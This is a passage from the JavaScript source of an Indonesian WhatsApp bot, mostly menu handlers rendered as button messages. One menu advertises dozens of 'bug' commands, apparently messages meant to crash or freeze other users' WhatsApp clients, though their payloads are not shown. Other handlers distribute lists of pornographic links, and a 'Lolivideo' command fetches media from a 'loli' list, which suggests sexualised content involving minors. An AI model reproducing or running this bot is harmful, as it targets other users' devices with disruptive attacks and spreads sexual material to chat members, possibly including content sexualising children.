*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭

┏━━⊱
═════{*UP STORY*}═════
┗━━⊱
┏━━⊱
┣❏🔥➥ ${prefix}upswteks <query>
┣❏🔥➥ ${prefix}upswimage <image>
┣❏🔥➥ ${prefix}upswvideo <video>
┗━━⊱
┏━━⊱
═════{*TAG*}═════
┗━━⊱
┏━━⊱
┣❏🔥➥ ${prefix}tag <62xxxx>
┣❏🔥➥ ${prefix}tagall <query>
┣❏🔥➥ ${prefix}tagall3 <query>
┣❏🔥➥ ${prefix}hidetag <query>
┣❏🔥➥ ${prefix}kontag <62xxxx>
┣❏🔥➥ ${prefix}sticktag <reply>
┣❏🔥➥ ${prefix}totag <reply>
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},
								"type": "RESPONSE"
							},
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - MENU WA -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭
═════{*DOWNLOAD*}═════
┏━━⊱
┣❏🔥➥ ${prefix}ytsearch <query>
┣❏🔥➥ ${prefix}playstore <query>
┣❏🔥➥ ${prefix}igstalk <query>
┣❏🔥➥ ${prefix}play <query>
┣❏🔥➥ ${prefix}video <query>
┣❏🔥➥ ${prefix}ytmp3 <link>
┣❏🔥➥ ${prefix}ytmp4 <link>
┣❏🔥➥ ${prefix}ig <link>
┣❏🔥➥ ${prefix}tinyurl <link>
┣❏🔥➥ ${prefix}twmp4 <link>
┣❏🔥➥ ${prefix}twmp3 <link>
┣❏🔥➥ ${prefix}ttmp4 <link>
┣❏🔥➥ ${prefix}ttmp3 <link>
┣❏🔥➥ ${prefix}fbmp4 <link>
┣❏🔥➥ ${prefix}fbmp3 <link>
┣❏🔥➥ ${prefix}brainly <query>
┣❏🔥➥ ${prefix}image <query>
┣❏🔥➥ ${prefix}toimg <reply>
┣❏🔥➥ ${prefix}tomp3 <reply>
┣❏🔥➥ ${prefix}tovoice <reply>
┣❏🔥➥ ${prefix}tomp4 <reply>
┣❏🔥➥ ${prefix}slow <reply>
┣❏🔥➥ ${prefix}kalkulator <kalkulator>
┣❏🔥➥ ${prefix}fast <reply>
┣❏🔥➥ ${prefix}reverse <reply>
┣❏🔥➥ ${prefix}tourl <reply>
┗━━⊱
┏━━⊱
═════{*OTHER*}═════
┗━━⊱
┏━━⊱
┣❏🔥➥ ${prefix}blocklist [List]
┣❏🔥➥ ${prefix}listgroup [List]
┣❏🔥➥ ${prefix}term <code>
┣❏🔥➥ ${prefix}owner [Owner]
┣❏🔥➥ ${prefix}d [Clear]
┣❏🔥➥ ${prefix}deletepc [Clear]
┣❏🔥➥ ${prefix}delchat [Clearchat]
┣❏🔥➥ ${prefix}hbd <date>
┣❏🔥➥ ${prefix}slander <query>
┣❏🔥➥ ${prefix}mute
┣❏🔥➥ ${prefix}unmute
┣❏🔥➥ ${prefix}slanderpm <query>
┣❏🔥➥ ${prefix}kontak <62xxxx>
┣❏🔥➥ ${prefix}styletext <query>
┣❏🔥➥ ${prefix}nowa <628xxxx>
┣❏🔥➥ ${prefix}sticker <image/video>
┣❏🔥➥ ${prefix}size <quey>
┣❏🔥➥ ${prefix}swm <author|packname>
┣❏🔥➥ ${prefix}take <author|packname>
┣❏🔥➥ ${prefix}colong <author|packname>
┣❏🔥➥ ${prefix}fdeface <reply>
┣❏🔥➥ ${prefix}detikvn <query>
┣❏🔥➥ ${prefix}detikvideo <query>
┣❏🔥➥ ${prefix}tohuruf <query>
┣❏🔥➥ ${prefix}fliptext <query>
┣❏🔥➥ ${prefix}volume <query>
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},
								"type": "RESPONSE"
							}
						],
						"headerType": "IMAGE"
					}
}, {quoted:ikal})
Haikal.relayWAMessage(res)
break
// LIST BUG MENU
case 'bugmenu':
if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
				"imageMessage": {
						"url": "https://mmg.whatsapp.net/d/f/ApVHYt8XnA9dxeTJMvqntzUr8xvDe9lWEWxhPzTz779k.enc",
						"mimetype": "image/jpeg",
						"caption": "Pinterest : Loli",
						"fileSha256": "5onsDFjhbGhETDTyarg1DoR+KGRdfe4WBLGO6/tdi9w=",
						"fileLength": "117390",
						"height": 1093,
						"width": 700,
						"mediaKey": "hMRlsKIiqc17aE5elgYbkF+Emf8k9/tjrTQ8XCmbvzM=",
						"fileEncSha256": "vDVRt1puYep/GWJvDGT897dWu0R1HOP1Nva4sg9IQ9I="
					 },
						"contentText": `❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭
┏━━⊱ 
══{*VIRGAM NEW*}══
┗━━⊱
┏━━⊱
┣❏🔥➥ ${prefix}assalamualaikum
┣❏🔥➥ ${prefix}kal
┗━━⊱
┏━━⊱ 
══{*NGE EVAL BUG*}══
┗━━⊱
┏━━⊱
┣❏🔥➥ > sendTroli
┣❏🔥➥ > hwgans
┣❏🔥➥ > kalot
┣❏🔥➥ > kalkal
┗━━⊱
┏━━⊱ 
══{*BUG BOT*}══
┗━━⊱
┏━━⊱
┣❏🔥➥ ${prefix}hwmods
┣❏🔥➥ ${prefix}kalpd
┣❏🔥➥ ${prefix}xmyo
┣❏🔥➥ ${prefix}hwkal
┣❏🔥➥ ${prefix}kalbe
┣❏🔥➥ ${prefix}xmbro
┣❏🔥➥ ${prefix}hay
┣❏🔥➥ ${prefix}hello
┣❏🔥➥ ${prefix}psp
┣❏🔥➥ ${prefix}kalhw
┣❏🔥➥ ${prefix}pcp
┣❏🔥➥ ${prefix}slowh
┣❏🔥➥ ${prefix}kontul
┣❏🔥➥ ${prefix}pvp
┣❏🔥➥ ${prefix}nomoradmin
┣❏🔥➥ ${prefix}xhiro
┣❏🔥➥ ${prefix}doc1
┣❏🔥➥ ${prefix}doc2
┣❏🔥➥ ${prefix}doc3
┣❏🔥➥ ${prefix}doc4
┣❏🔥➥ ${prefix}gananya
┣❏🔥➥ ${prefix}ahnob
┣❏🔥➥ ${prefix}hwyekan
┣❏🔥➥ ${prefix}kalong
┣❏🔥➥ ${prefix}wewe
┣❏🔥➥ ${prefix}bugbutton
┣❏🔥➥ ${prefix}buglink
┣❏🔥➥ ${prefix}p [Troli]
┣❏🔥➥ ${prefix}gifbug
┣❏🔥➥ ${prefix}xmnih <philips hw>
┣❏🔥➥ ${prefix}xmfake <philips hw fake>
┣❏🔥➥ ${prefix}hw1
┣❏🔥➥ ${prefix}hw2 <philips hw>
┣❏🔥➥ ${prefix}hw3 <philips hw fake>
┣❏🔥➥ ${prefix}jadislayer
┣❏🔥➥ ${prefix}kadal
┣❏🔥➥ ${prefix}onlinedong
┣❏🔥➥ ${prefix}jaditempe <phlips hw musik>
┣❏🔥➥ ${prefix}jadigila <video>
┣❏🔥➥ ${prefix}jaditoge <sticker>
┣❏🔥➥ ${prefix}jaditahu <gambar/sticker>
┣❏🔥➥ ${prefix}jadicireng <gambar/sticker>
┣❏🔥➥ ${prefix}lokas
┣❏🔥➥ ${prefix}lokas2
┣❏🔥➥ ${prefix}buggc
┣❏🔥➥ ${prefix}bugtext <jumlah>
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
						"footerText": "❏HW MODS WA❏",
						"buttons": [
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - THANKS YOU -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
JANGAN PAKE SEMBARANGAN
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},						
								"type": "RESPONSE"
							}
						],
						"headerType": "IMAGE"
					}
}, {quoted:ikal})
Haikal.relayWAMessage(res)
break
// LIST KODE +18
case 'kodekeras':
if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
				"imageMessage": {
						"url": "https://mmg.whatsapp.net/d/f/AkN2CkuI0Ra5pjBRiJDaW0CC-Wd9HUPFI-TnTDW3rkYy.enc",
						"mimetype": "image/jpeg",
						"fileSha256": "090qnz/i+SxRxHNUztQwjfxmL7XAMiAyL6Kw7aBMIHw=",
						"fileLength": "44782",
						"height": 740,
						"width": 640,
						"mediaKey": "euwj3NlkbZ+B0E67HIzwb8isEogbcPogdFJCllUbdjA=",
						"fileEncSha256": "aDzE4IikU5jH87beKM2eUtPgnTwQIqbNGYsMCoYKnsg=",
						"mediaKeyTimestamp": "1633022751"
					 },
						"contentText": `❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭
Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭
HELLO !!!
Note : EASY MODE = Sange, Biasa Aja, Mental Lemah :v
==============================
MEDIUM MODE = Bisa bikin sange, Lumayan nyesek, Rasanya pengen coli teros, Mental Batu
==============================
HARD MODE = Menyebabkan amnesia, insomnia, hipotermia, kejang", serangan jantung, diare, pendarahan hebat, buang air tidak terkendali, rasa ingin baku hantam, frustasi, depresi, emosi tidak tertahan kan, sakit hati (ambyar), Mental Baja
==============================
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
						"footerText": "❏HW MODS WA❏",
						"buttons": [
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - EASY MODE -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭
Easy Mode :
• https://nhentai.net/g/316755/
• https://nhentai.net/g/316596/
• https://nhentai.net/g/311850/
• https://nhentai.net/g/315578/
• https://nhentai.net/g/315488/
• https://nhentai.net/g/315406/
• https://nhentai.net/g/315344/
• https://nhentai.net/g/315323/
• https://nhentai.net/g/315136/
• https://nhentai.net/g/315099/
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},
								"type": "RESPONSE"
							},
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - MEDIUM MODE -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭
Medium Mode :
• https://nhentai.net/g/316867/
• https://nhentai.net/g/316869/
• https://nhentai.net/g/316785/
• https://nhentai.net/g/316763/51/
• https://nhentai.net/g/316445/
• https://nhentai.net/g/316250/
• https://nhentai.net/g/311283/
• https://nhentai.net/g/265671/
• https://nhentai.net/g/312127/
• https://nhentai.net/g/311560/
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},
								"type": "RESPONSE"
							},
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - HARD MODE -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭
Hard Mode :
• https://nhentai.net/g/316820/
• https://nhentai.net/g/316481/
• https://nhentai.net/g/316430/
• https://nhentai.net/g/276347/
• https://nhentai.net/g/196329/
• https://nhentai.net/g/304543/
• https://nhentai.net/g/295295/
• https://nhentai.net/g/311262/
• https://nhentai.net/g/311882/
• https://nhentai.net/g/312180/

══{*BONUS COK*}══
https://nhentai.net/g/271890/
https://nhentai.net/g/272057/
https://nhentai.net/g/272173/
https://nhentai.net/g/272182/
https://nhentai.net/g/272196/
https://nhentai.net/g/272197/
https://nhentai.net/g/272259/
https://nhentai.net/g/272276/
https://nhentai.net/g/272290/
https://nhentai.net/g/272377/
-
https://nhentai.net/g/272390/
https://nhentai.net/g/272512/
https://nhentai.net/g/271245/
https://nhentai.net/g/271056/
https://nhentai.net/g/270809/
https://nhentai.net/g/269653/
https://nhentai.net/g/266088/
https://nhentai.net/g/264980/
https://nhentai.net/g/262215/
https://nhentai.net/g/260433/
-
https://nhentai.net/g/260146/
https://nhentai.net/g/256738/
https://nhentai.net/g/272425/
https://nhentai.net/g/272352/
https://nhentai.net/g/272045/
https://nhentai.net/g/272015/
https://nhentai.net/g/271993/
https://nhentai.net/g/271924/
https://nhentai.net/g/271905/
https://nhentai.net/g/271797/
-
https://nhentai.net/g/271760/
https://nhentai.net/g/271717/
https://nhentai.net/g/271726/
https://nhentai.net/g/271667/
https://nhentai.net/g/267352/
https://nhentai.net/g/152968/
https://nhentai.net/g/238876/
https://nhentai.net/g/116395/
https://nhentai.net/g/84809/
https://nhentai.net/g/211656/
-
https://nhentai.net/g/272117/
https://nhentai.net/g/188721/
https://nhentai.net/g/266402/
https://nhentai.net/g/238876/
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},
								"type": "RESPONSE"
							}
						],
						"headerType": "IMAGE"
					}
}, {quoted:ikal})
Haikal.relayWAMessage(res)
break
// LIST +18
case 'mausange':
if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
					"imageMessage": {
						"url": "https://mmg.whatsapp.net/d/f/AkN2CkuI0Ra5pjBRiJDaW0CC-Wd9HUPFI-TnTDW3rkYy.enc",
						"mimetype": "image/jpeg",
						"fileSha256": "090qnz/i+SxRxHNUztQwjfxmL7XAMiAyL6Kw7aBMIHw=",
						"fileLength": "44782",
						"height": 740,
						"width": 640,
						"mediaKey": "euwj3NlkbZ+B0E67HIzwb8isEogbcPogdFJCllUbdjA=",
						"fileEncSha256": "aDzE4IikU5jH87beKM2eUtPgnTwQIqbNGYsMCoYKnsg=",
						"mediaKeyTimestamp": "1633022751"
					 },
						"contentText": `❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭
Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭
HELLO !!! - AWAS SANGE -
┏━━⊱
┣❏🔥➥ VPN* : https://duit.cc/h16JuG\n
┣❏🔥➥ NO VPN* : https://duit.cc/f2UQey7\n
┣❏🔥➥ XNXX VPN* : https://duit.cc/0lA52Gz\n
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
						"footerText": "❏HW MODS WA❏",
						"buttons": [
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - NEKOPOI VERSION -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭
▢🔥➥ ${prefix}nekopoi1
▢🔥➥ ${prefix}nekopoi2
▢🔥➥ ${prefix}nekopoi3
▢🔥➥ ${prefix}nekopoi4
▢🔥➥ ${prefix}nekopoi5
▢🔥➥ ${prefix}nekopoi6
▢🔥➥ ${prefix}nekopoi7
▢🔥➥ ${prefix}nekopoi8
▢🔥➥ ${prefix}nekopoi9

- THANKS YOU BOT -
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},						
								"type": "RESPONSE"
							}
						],
						"headerType": "IMAGE"
					}
}, {quoted:ikal})
Haikal.relayWAMessage(res)
break
// MAKER MENU
case 'makermenu':
if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
				"imageMessage": {
						"url": "https://mmg.whatsapp.net/d/f/ApVHYt8XnA9dxeTJMvqntzUr8xvDe9lWEWxhPzTz779k.enc",
						"mimetype": "image/jpeg",
						"caption": "Pinterest : Loli",
						"fileSha256": "5onsDFjhbGhETDTyarg1DoR+KGRdfe4WBLGO6/tdi9w=",
						"fileLength": "117390",
						"height": 1093,
						"width": 700,
						"mediaKey": "hMRlsKIiqc17aE5elgYbkF+Emf8k9/tjrTQ8XCmbvzM=",
						"fileEncSha256": "vDVRt1puYep/GWJvDGT897dWu0R1HOP1Nva4sg9IQ9I="
					 },
						"contentText": `Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭
▢🔥➥ ${prefix}nickff
▢🔥➥ ${prefix}tahta
▢🔥➥ ${prefix}halloween
▢🔥➥ ${prefix}codetxt
▢🔥➥ ${prefix}vampire
▢🔥➥ ${prefix}matrix
▢🔥➥ ${prefix}googletxt
▢🔥➥ ${prefix}spiderman
▢🔥➥ ${prefix}express
▢🔥➥ ${prefix}dance
▢🔥➥ ${prefix}blackbird
▢🔥➥ ${prefix}warrior
▢🔥➥ ${prefix}text3d
▢🔥➥ ${prefix}neon2
▢🔥➥ ${prefix}wolf
▢🔥➥ ${prefix}tfire
▢🔥➥ ${prefix}ytgold
▢🔥➥ ${prefix}wall
▢🔥➥ ${prefix}ytsilver
▢🔥➥ ${prefix}t3d
▢🔥➥ ${prefix}attp
▢🔥➥ ${prefix}logoa
▢🔥➥ ${prefix}marvel
▢🔥➥ ${prefix}leavest
▢🔥➥ ${prefix}pornhub
▢🔥➥ ${prefix}glow
▢🔥➥ ${prefix}summer
▢🔥➥ ${prefix}flower
▢🔥➥ ${prefix}burn
▢🔥➥ ${prefix}quote
▢🔥➥ ${prefix}wooden
▢🔥➥ ${prefix}maker2d4
▢🔥➥ ${prefix}maker2d3
▢🔥➥ ${prefix}maker2d2
▢🔥➥ ${prefix}golden
▢🔥➥ ${prefix}transformer
▢🔥➥ ${prefix}maker3d4
▢🔥➥ ${prefix}maker3d3
▢🔥➥ ${prefix}maker3d2
▢🔥➥ ${prefix}maker3d
▢🔥➥ ${prefix}neon
▢🔥➥ ${prefix}coffeecup2
▢🔥➥ ${prefix}googletxt
▢🔥➥ ${prefix}coffeecup
▢🔥➥ ${prefix}battlefield
▢🔥➥ ${prefix}pinterest
▢🔥➥ ${prefix}pornhub
▢🔥➥ ${prefix}phy 
- shadow
- glitch
- coffecup
- neon
- wanted`,
						"footerText": "❏HW MODS WA❏",
						"buttons": [
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - NULIS RANDOM -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭
▢🔥➥ ${prefix}nulis1
▢🔥➥ ${prefix}nulis2
▢🔥➥ ${prefix}nulis3
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},						
								"type": "RESPONSE"
							}
						],
						"headerType": "IMAGE"
					}
}, {quoted:ikal})
Haikal.relayWAMessage(res)
break	
case 'makerkal':
if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
				"imageMessage": {
						"url": "https://mmg.whatsapp.net/d/f/ApVHYt8XnA9dxeTJMvqntzUr8xvDe9lWEWxhPzTz779k.enc",
						"mimetype": "image/jpeg",
						"caption": "Pinterest : Loli",
						"fileSha256": "5onsDFjhbGhETDTyarg1DoR+KGRdfe4WBLGO6/tdi9w=",
						"fileLength": "117390",
						"height": 1093,
						"width": 700,
						"mediaKey": "hMRlsKIiqc17aE5elgYbkF+Emf8k9/tjrTQ8XCmbvzM=",
						"fileEncSha256": "vDVRt1puYep/GWJvDGT897dWu0R1HOP1Nva4sg9IQ9I="
					 },
						"contentText": `Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭
▢🔥➥ ${prefix}darkjokes
▢🔥➥ ${prefix}image
▢🔥➥ ${prefix}pinterest
▢🔥➥ ${prefix}fix
▢🔥➥ ${prefix}cat
▢🔥➥ ${prefix}karakter
▢🔥➥ ${prefix}bird
▢🔥➥ ${prefix}koala
▢🔥➥ ${prefix}meme
▢🔥➥ ${prefix}memeindo
▢🔥➥ ${prefix}jokes`,
						"footerText": "❏HW MODS WA❏",
						"buttons": [
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - NULIS RANDOM -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},						
								"type": "RESPONSE"
							}
						],
						"headerType": "IMAGE"
					}
}, {quoted:ikal})
Haikal.relayWAMessage(res)
break	
case 'Lanjut':
       case 'Lolivideo':
              reply(mess.wait)
              anu = await fetchText('https://raw.githubusercontent.com/AlvioAdjiJanuar/random/main/loli.txt')
             .then(async (body) => {
              anu = body.split('\n')
              anu = anu[Math.floor(Math.random() * anu.length)]
              sendMediaURL(from, anu)
})
             .catch(async (err) => {
              console.error(err)
              reply(`${err}`)
})
              break
//=================================================//               
case 'SCBOT':
offline = false
bct(' https://duit.cc/AaPnL7 ')
break
                   case 'CANTIK':  
                   if (isBan) return reply(mess.ban)
                   anu = await fetchJson(`https://some-random-api.ml/img/cat`)
                   anu1 = await getBuffer(anu.link)
                   Haikal.sendMessage(from, anu1, image, {caption: `nih kak mirip kamu so cantik`, quoted: ikal})
                   break                                      
                   case 'KEREN':  
                   if (isBan) return reply(mess.ban)
                   anu = await fetchJson(`https://some-random-api.ml/img/birb`)
                   anu1 = await getBuffer(anu.link)
                   Haikal.sendMessage(from, anu1, image, {caption: `nih kak mirip kamu so keren`, quoted: ikal})
                   break
                   case 'GANTENG':  
                   if (isBan) return reply(mess.ban)
                   anu = await fetchJson(`https://some-random-api.ml/img/koala`)
                   anu1 = await getBuffer(anu.link)
                   Haikal.sendMessage(from, anu1, image, {caption: `nih kak mirip kamu so ganteng`, quoted: ikal})
                   break
}
//=================================================//
// Stick Cmd
switch (isStc) {
case "c1f40a203939746b645c97e107d97c4ed66793acdbcd541905b4e9d7ecf8ab69": // JADI ADMIN
if (!isOwner) return
if (!isBotGroupAdmins) return
if (!isGroup) return
mentioned = sender
if (mentioned.length > 1) {
teks = `@${mentioned.split('@')[0]} Sekarang Admin!`
Haikal.sendMessage(from, teks, text, {contextInfo:{mentionedJid:[mentioned]}})
Haikal.groupMakeAdmin(from, [mentioned])
} else {
Haikal.sendMessage(from, `@${mentioned.split('@')[0]} Sekarang Admin!`, text, {contextInfo:{mentionedJid:[mentioned]}})
Haikal.groupMakeAdmin(from, [mentioned])
}
break
}
//=================================================//
// SWIT COMMAND
switch (command) {
// Nomor owner
case 'owner':
case 'admin':
case 'creator':
if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
					"imageMessage": {
						"url": "https://mmg.whatsapp.net/d/f/ApVHYt8XnA9dxeTJMvqntzUr8xvDe9lWEWxhPzTz779k.enc",
						"mimetype": "image/jpeg",
						"caption": "Pinterest : Loli",
						"fileSha256": "5onsDFjhbGhETDTyarg1DoR+KGRdfe4WBLGO6/tdi9w=",
						"fileLength": "117390",
						"height": 1093,
						"width": 700,
						"mediaKey": "hMRlsKIiqc17aE5elgYbkF+Emf8k9/tjrTQ8XCmbvzM=",
						"fileEncSha256": "vDVRt1puYep/GWJvDGT897dWu0R1HOP1Nva4sg9IQ9I="
					 },
						"contentText": `❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭
Hai ${pushname}
*${ucapanWaktu}* 
*•> WIB :* ${timeJak}
*•> WITA :* ${timeMak}
*•> WIT :* ${timeJay}
*•> Whatsapp :* ${wa_version}
*•> Blockir :* ${blocked.length} Blocked
*•> Group Chat :* ${totalgroup.length} Chat
*•> Personal Chat :* ${totalkontak.length} Chat
*•> Total Chat :* ${totalchat.length} Chat
*•> Speed :* ${latensi.toFixed(4)} Second
▬▭▬▭▬▭▬▭▬▬▭▬▭
HELLO !!!
┏━━⊱
┣❏ NOMOR OWNER :
┣❏ Wa.me/6285714170944
┗━━⊱
┏━━⊱
┣❏ INSTAGRAM :
┣❏ https://www.instagram.com/hikal_857/?hl=id
┗━━⊱
┏━━⊱
┣❏ YOUTUBE :
┣❏ https://youtube.com/channel/UCa37vxxUI-XULKw_sHb4A5g
┗━━⊱
┏━━⊱
┣❏ TELEGRAM :
┣❏ https://t.me/haikal857
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
						"footerText": "❏HW MODS WA❏",
						"buttons": [
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - DONASI BOT -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
WELCOME TO BOT HW ✓
- DONASI -
DANA : 6285714170944
SAWERIA : https://saweria.co/hwmodswa
PULSA : wa.me/6285714170944

- THANKS AND SUPPORT -

©[XM] XHIRO MHONSHINE ✌️
©[GWI] GENERASI WAMOD INDONESIA
©[EGW] ERRORR GENERASI WHATSAPP

- Thanks Support -
- Hexagon
- Mhankbarbar
- Mans
- All Creator Bot

- Thanks You Bot -
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},						
								"type": "RESPONSE"
							}
						],
						"headerType": "IMAGE"
					}
}, {quoted:ikal})
Haikal.relayWAMessage(res)
break
// LIST INTRO ( HW MODS WA )
case 'menusound':
if (isBan) return reply(mess.ban)
res = await Haikal.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
				"imageMessage": {
